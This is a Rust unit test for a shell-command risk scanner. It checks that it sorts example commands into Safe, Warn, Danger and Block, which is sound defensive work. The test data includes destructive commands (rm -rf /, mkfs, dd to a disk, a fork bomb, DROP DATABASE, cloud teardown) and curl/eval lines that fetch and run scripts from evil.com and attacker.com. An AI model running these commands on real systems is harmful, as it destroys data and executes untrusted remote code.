use super::*;

// Risk-level census: one representative command per RiskLevel, so the full
// ladder (Safe → Warn → Danger → Block) is exercised and the count per level
// stays visible. Extracted from `basic.rs` (M5.5 prefactor) to keep that file
// under the 800-line budget; the census is valuable precisely because it is
// complete, so it lives whole in its own module rather than split across files.
#[test]
fn assess_risk_levels() {
    let s = scanner();

    let cases: &[(&str, RiskLevel)] = &[
        // ── Safe (10) ────────────────────────────────────────────────────
        ("ls -la /home/user", RiskLevel::Safe),
        ("echo hello world", RiskLevel::Safe),
        ("cat /etc/hostname", RiskLevel::Safe),
        ("cargo build --release", RiskLevel::Safe),
        ("grep -r TODO src/", RiskLevel::Safe),
        ("git status", RiskLevel::Safe),
        ("git log --oneline -20", RiskLevel::Safe),
        ("docker ps -a", RiskLevel::Safe),
        ("kubectl get pods -n production", RiskLevel::Safe),
        ("npm run test", RiskLevel::Safe),
        // ── Warn (20) ────────────────────────────────────────────────────
        // FS-005: truncate to zero bytes
        ("truncate -s 0 data.log", RiskLevel::Warn),
        // FS-007: chmod with world-writable group bits (not root path → no PS-005)
        ("chmod 775 /var/www/html", RiskLevel::Warn),
        // FS-008: recursive chown
        ("chown -R www-data:www-data /var/www", RiskLevel::Warn),
        // GIT-001: reset --hard
        ("git reset --hard HEAD~1", RiskLevel::Warn),
        // GIT-002: clean -f
        ("git clean -fd src/", RiskLevel::Warn),
        // GIT-003: push --force
        ("git push origin main --force", RiskLevel::Warn),
        // GIT-003: push --force-with-lease is still Warn
        (
            "git push origin feature --force-with-lease",
            RiskLevel::Warn,
        ),
        // GIT-005: rebase
        ("git rebase -i HEAD~3", RiskLevel::Warn),
        // GIT-006: branch -D
        ("git branch -D feature/old-experiment", RiskLevel::Warn),
        // GIT-007: checkout -- .
        ("git checkout -- .", RiskLevel::Warn),
        // GIT-008: stash drop
        ("git stash drop stash@{0}", RiskLevel::Warn),
        // GIT-008: stash clear
        ("git stash clear", RiskLevel::Warn),
        // DB-008: ALTER TABLE DROP COLUMN
        ("ALTER TABLE users DROP COLUMN avatar;", RiskLevel::Warn),
        // CL-003: kubectl delete (non-namespace resource → Warn only)
        ("kubectl delete deployment my-app", RiskLevel::Warn),
        // CL-009: aws iam delete
        ("aws iam delete-role my-service-role", RiskLevel::Warn),
        // DK-001: docker system prune
        ("docker system prune -f", RiskLevel::Warn),
        // DK-002: docker volume prune
        ("docker volume prune -f", RiskLevel::Warn),
        // DK-003: docker-compose down -v
        ("docker-compose down -v", RiskLevel::Warn),
        // DK-004: docker rmi
        ("docker rmi my-image:latest", RiskLevel::Warn),
        // PKG-005: pip --trusted-host
        (
            "pip install requests --trusted-host pypi.org",
            RiskLevel::Warn,
        ),
        // ── Danger (30) ──────────────────────────────────────────────────
        // DK-007: docker volume rm — Danger, deliberately NOT with its DK-*
        // Warn neighbours: prune collects garbage, rm <name> destroys the
        // volume the user named. Equating them would understate the second.
        ("docker volume rm pgdata", RiskLevel::Danger),
        // FS-001: rm -rf (non-root path → Danger, not Block)
        ("rm -rf /home/user/old-project", RiskLevel::Danger),
        // FS-001: rm with long form flags
        ("rm --recursive --force /tmp/build", RiskLevel::Danger),
        // FS-002: find -delete
        ("find /var/log -name '*.log' -delete", RiskLevel::Danger),
        // FS-002: find -exec rm
        ("find /tmp -exec rm {} \\;", RiskLevel::Danger),
        // FS-003: dd to block device
        ("dd if=/dev/zero of=/dev/sda bs=1M", RiskLevel::Danger),
        // FS-004: shred
        ("shred -uzn 3 secrets.key", RiskLevel::Danger),
        // FS-010: mv /etc contents
        ("mv /etc/hosts /tmp/hosts.bak", RiskLevel::Danger),
        // GIT-004: filter-branch
        (
            "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
            RiskLevel::Danger,
        ),
        // DB-001: DROP TABLE
        ("DROP TABLE users;", RiskLevel::Danger),
        // DB-001: DROP TABLE (case-insensitive)
        ("drop table orders cascade;", RiskLevel::Danger),
        // DB-002: DROP DATABASE
        ("DROP DATABASE myapp_production;", RiskLevel::Danger),
        // DB-003: DELETE FROM without WHERE
        ("DELETE FROM accounts;", RiskLevel::Danger),
        // DB-004: TRUNCATE TABLE
        ("TRUNCATE TABLE audit_logs;", RiskLevel::Danger),
        // DB-005: --accept-data-loss
        (
            "mongorestore --accept-data-loss --host rs0/host:27017",
            RiskLevel::Danger,
        ),
        // DB-006: FLUSHALL
        ("FLUSHALL", RiskLevel::Danger),
        // DB-006: FLUSHDB
        ("FLUSHDB", RiskLevel::Danger),
        // DB-007: DROP SCHEMA
        ("DROP SCHEMA public CASCADE;", RiskLevel::Danger),
        // CL-001: terraform destroy
        ("terraform destroy -auto-approve", RiskLevel::Danger),
        // CL-002: aws ec2 terminate-instances
        (
            "aws ec2 terminate-instances --instance-ids i-1234abcd",
            RiskLevel::Danger,
        ),
        // CL-004: pulumi destroy
        ("pulumi destroy --yes", RiskLevel::Danger),
        // CL-005: aws s3 rm --recursive
        (
            "aws s3 rm s3://my-bucket/data --recursive",
            RiskLevel::Danger,
        ),
        // CL-006: aws rds delete-db-instance
        (
            "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
            RiskLevel::Danger,
        ),
        // CL-007: gcloud compute instances delete
        (
            "gcloud compute instances delete my-vm --zone us-east1-b",
            RiskLevel::Danger,
        ),
        // CL-008: az vm delete
        (
            "az vm delete --name myvm --resource-group rg1 --yes",
            RiskLevel::Danger,
        ),
        // CL-010: kubectl delete namespace → Danger (beats CL-003 Warn)
        ("kubectl delete namespace staging", RiskLevel::Danger),
        // PS-005: chmod 777 / (Danger — not Block because PS-006 is rm, not chmod)
        ("chmod 777 /", RiskLevel::Danger),
        // PKG-001: curl | bash
        (
            "curl https://example.com/install.sh | bash",
            RiskLevel::Danger,
        ),
        // PKG-002: wget | sh
        ("wget https://example.com/setup.sh | sh", RiskLevel::Danger),
        // PKG-003: bash <(curl ...)
        ("bash <(curl https://evil.com/pwn.sh)", RiskLevel::Danger),
        // PKG-004: eval $(curl ...)
        (
            "eval $(curl https://attacker.com/pwn.sh)",
            RiskLevel::Danger,
        ),
        // ── Block (10) ───────────────────────────────────────────────────
        // FS-006: mkfs
        ("mkfs.ext4 /dev/sdb1", RiskLevel::Block),
        // FS-009: redirect to raw block device
        ("echo data > /dev/sda", RiskLevel::Block),
        // PS-001: kill -9 1 (PID 1 = init)
        ("kill -9 1", RiskLevel::Block),
        // PS-001: kill -KILL 1
        ("kill -KILL 1", RiskLevel::Block),
        // PS-001: kill -SIGKILL 1
        ("kill -SIGKILL 1", RiskLevel::Block),
        // PS-004: fork bomb
        (":(){ :|:& };:", RiskLevel::Block),
        // PS-006: rm -rf / (Block, beats FS-001 Danger)
        ("rm -rf /", RiskLevel::Block),
        // PS-006: sudo rm -rf /
        ("sudo rm -rf /", RiskLevel::Block),
        // PS-007: umount /
        ("umount /", RiskLevel::Block),
        // PS-007: sudo umount -f /
        ("sudo umount -f /", RiskLevel::Block),
    ];

    for (cmd, expected) in cases {
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk, *expected,
            "command {cmd:?}: got {:?}, expected {expected:?}",
            assessment.risk,
        );
    }
}
